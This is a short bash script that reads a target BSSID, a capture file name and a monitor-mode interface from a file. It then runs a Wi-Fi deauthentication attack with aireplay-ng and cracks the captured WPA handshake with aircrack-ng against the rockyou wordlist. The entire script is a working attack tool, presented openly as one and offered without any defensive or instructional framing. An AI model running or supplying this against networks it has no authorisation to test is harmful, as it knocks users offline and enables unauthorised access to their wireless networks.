#! /bin/bash

# read data from file line by line
file='random_file_name_with_logs.txt'
i=1

while read line; do
    if [[ $i == 1 ]]; then
        bssid=$line
    elif [[ $i == 2 ]]; then
        filename=$line
    elif [[ $i == 3 ]]; then
        wifi_card_mon=$line
    fi
    i=$((i+1))
done < $file

# begin deauth attack
printf "Write number of deauthorizations: "
read attempt_num
aireplay-ng --deauth $attempt_num -a $bssid --ignore-negative-one $wifi_card_mon

# enumeration of passwords
aircrack-ng -w '/usr/share/wordlists/rockyou.txt' -b $bssid "hacks/"$filename"-01.cap"